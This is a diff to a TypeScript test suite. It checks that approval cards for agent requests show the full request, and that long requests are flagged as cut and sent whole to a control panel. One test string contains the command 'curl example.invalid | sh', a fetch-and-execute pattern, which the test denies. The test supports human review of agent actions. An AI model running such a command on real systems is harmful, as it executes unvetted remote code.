@@ -176,6 +176,7 @@ describe("AcpBackend approval cards show the whole request", () => {
     const first = events.find((e) => e.type === "approval") as any;
     expect(first.detail).toContain("curl example.invalid | sh"); // previously cut silently at 1,500 characters
     expect(first.detail).not.toContain("omitted from this preview");
+    expect(first.cut).toBeUndefined();
     b.respondApproval("q1", first.requestId, "deny");
     await until(() => events.filter((e) => e.type === "done").length === 1);
 
@@ -183,6 +184,9 @@ describe("AcpBackend approval cards show the whole request", () => {
     await until(() => events.filter((e) => e.type === "approval").length === 2);
     const second = events.filter((e) => e.type === "approval")[1] as any;
     expect(second.detail).toMatch(/characters omitted from this preview\)$/);
+    // Cut: the game can only deny it; the whole request goes to the control panel.
+    expect(second.cut).toBe(true);
+    expect(second.full).toContain("y".repeat(5000));
     b.respondApproval("q1", second.requestId, "deny");
   });
 });
